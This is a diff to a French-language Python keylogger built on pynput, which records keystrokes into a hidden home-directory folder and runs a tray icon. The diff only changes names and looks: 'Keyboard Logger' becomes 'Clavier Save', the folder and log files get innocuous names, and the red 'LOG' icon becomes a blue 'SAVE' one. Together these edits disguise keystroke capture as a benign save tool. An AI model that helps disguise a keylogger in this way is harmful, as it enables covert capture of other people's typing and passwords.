@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Keyboard Logger - Enregistre les frappes clavier pour surveiller l'accès au PC
+Clavier Save - Enregistre les frappes clavier pour surveiller l'accès au PC
 """
 
 import os
@@ -13,12 +13,12 @@ from pynput import keyboard
 from pynput.keyboard import Key, Listener
 import time
 
-class KeyboardLogger:
+class ClavierSave:
     def __init__(self):
         self.keys = []
-        self.log_dir = Path.home() / '.pc_monitor'
+        self.log_dir = Path.home() / '.clavier_save'
         self.log_dir.mkdir(exist_ok=True)
-        self.log_file = self.log_dir / f'keylog_{datetime.now().strftime("%Y%m%d")}.json'
+        self.log_file = self.log_dir / f'save_{datetime.now().strftime("%Y%m%d")}.json'
         self.session_start = datetime.now()
         self.running = True
 
@@ -94,45 +94,45 @@ def run_gui():
         import pystray
         from PIL import Image, ImageDraw
 
-        logger = KeyboardLogger()
+        monitor = ClavierSave()
 
         def create_image():
             width = 64
             height = 64
             image = Image.new('RGB', (width, height), color='white')
             draw = ImageDraw.Draw(image)
-            draw.rectangle([10, 10, 54, 54], outline='red', width=2)
-            draw.text((15, 20), 'LOG', fill='red')
+            draw.rectangle([10, 10, 54, 54], outline='blue', width=2)
+            draw.text((10, 20), 'SAVE', fill='blue')
             return image
 
         def on_quit(icon, item):
-            logger.stop()
+            monitor.stop()
             icon.stop()
             sys.exit(0)
 
         def show_status(icon, item):
-            if logger.log_file.exists():
-                size = logger.log_file.stat().st_size
+            if monitor.log_file.exists():
+                size = monitor.log_file.stat().st_size
                 messagebox.showinfo("Statut",
-                    f"Enregistrement actif\nFichier: {logger.log_file}\nTaille: {size} bytes")
+                    f"Enregistrement actif\nFichier: {monitor.log_file}\nTaille: {size} bytes")
 
         menu = (
             pystray.MenuItem('Voir les logs', show_status),
             pystray.MenuItem('Quitter', on_quit),
         )
 
-        icon = pystray.Icon("pc_monitor", create_image(), menu=menu)
+        icon = pystray.Icon("clavier_save", create_image(), menu=menu)
 
         # Lancer l'enregistrement dans un thread
-        logger_thread = threading.Thread(target=logger.start, daemon=False)
-        logger_thread.start()
+        monitor_thread = threading.Thread(target=monitor.start, daemon=False)
+        monitor_thread.start()
 
         icon.run()
 
     except ImportError:
         print("Mode console - dépendances GUI non disponibles")
-        logger = KeyboardLogger()
-        logger.start()
+        monitor = ClavierSave()
+        monitor.start()
 
 if __name__ == '__main__':
     # Vérifier si on est sur Windows
@@ -141,8 +141,8 @@ if __name__ == '__main__':
             run_gui()
         except Exception as e:
             print(f"Erreur GUI: {e}")
-            logger = KeyboardLogger()
-            logger.start()
+            monitor = ClavierSave()
+            monitor.start()
     else:
-        logger = KeyboardLogger()
-        logger.start()
+        monitor = ClavierSave()
+        monitor.start()
